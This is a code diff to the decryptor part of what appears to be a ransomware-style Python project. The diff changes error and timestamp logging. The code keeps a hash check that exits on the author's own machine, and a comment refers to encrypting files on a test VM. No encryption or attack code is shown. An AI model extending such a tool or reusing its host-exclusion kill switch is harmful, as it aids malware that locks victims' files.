@@ -43,11 +43,7 @@ class decrypt(object):
                     f.write(self.decrypt(data))
                 os.rename(file,file[:-5])
             except Exception as exception:
-                if os.path.exists('errorslog.txt'):
-                    writemode = 'a'
-                else:
-                    writemode ='w'
-                with open('errorsloginrun.txt',writemode,encoding='utf-8')as f:
+                with open('errorslogdecrypt.txt','a',encoding='utf-8')as f:
                     f.write(str(exception))
                     f.write('\n')
                
@@ -60,16 +56,24 @@ class decrypt(object):
             
 if __name__ == "__main__":
     hash = hashlib.md5(decrypt.EmergencyBreak().encode('utf-8')).hexdigest()
-    try:        
+    try:
+        localtime = time.asctime( time.localtime(time.time()) )
+        with open('errorslogdecrypt.txt','w',encoding='utf-8') as f:
+            f.write(str(localtime))
+            f.write('\n')
+
         if hash =='8abe12940cc6d19c7984cbe78ebe6213':#break on my machine                             #Comment this line for test  #am sick of encrypting my own file, let's just test on VM although it is incredibly slow olo
             exit()
         test = decrypt()
         test.run()
+
+        localtime2 = time.asctime(time.localtime(time.time()))
+        
+        with open('errorfile.txt','a',encoding='utf-8') as f:
+            f.write(str(localtime2))
+            f.write('\n')
+            
     except Exception as exception:
-        if os.path.exists('errorslog.txt'):
-            writemode = 'a'
-        else:
-            writemode ='w'
-        with open('errorslog.txt',writemode,encoding='utf-8')as f:
+        with open('errorslogdecrypt.txt','a',encoding='utf-8')as f:
             f.write(str(exception))
             f.write('\n')
